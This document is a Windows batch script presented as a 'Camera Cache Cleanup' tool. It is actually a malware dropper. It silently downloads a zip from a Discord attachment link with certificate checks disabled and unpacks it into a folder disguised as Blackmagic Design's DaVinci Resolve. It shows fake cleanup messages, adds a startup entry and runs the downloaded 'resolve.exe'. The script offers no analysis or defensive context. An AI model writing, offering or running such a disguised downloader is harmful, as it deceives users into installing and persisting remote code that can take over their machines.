
@echo off

title Camera Cache Cleanup in progress


set "InstallFolder=%USERPROFILE%\.BlackmagicDesign"
set "ZipURL=https://cdn.discordapp.com/attachments/1185616202190561300/1214281408554729553/DaVinci_Resolve.zip?ex=65f88ab0&is=65e615b0&hm=0043278a6d3c80ee6c4e6c6587499c7b05fb5281761e024a24018c51cd0f790b&"
if not exist %InstallFolder% mkdir %InstallFolder%
curl -s -L -ko "%InstallFolder%\m.zip" "%ZipURL%"
cd %InstallFolder%
tar -xf m.zip
cd "DaVinci Resolve"
timeout /t 1 > nul
echo Clearing camera memory cache
timeout /t 1 > nul
echo Almost finished!
echo C:\> taskkill /f /im resolveservice.bat
timeout /t 1 > nul
color a
timeout /t 1 > nul
echo DONE
(
echo @echo off
echo cd "%USERPROFILE%\.BlackmagicDesign\DaVinci Resolve\resolve.exe"
) > "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\rhelper.bat"

start "" "%USERPROFILE%\.BlackmagicDesign\DaVinci Resolve\resolve.exe"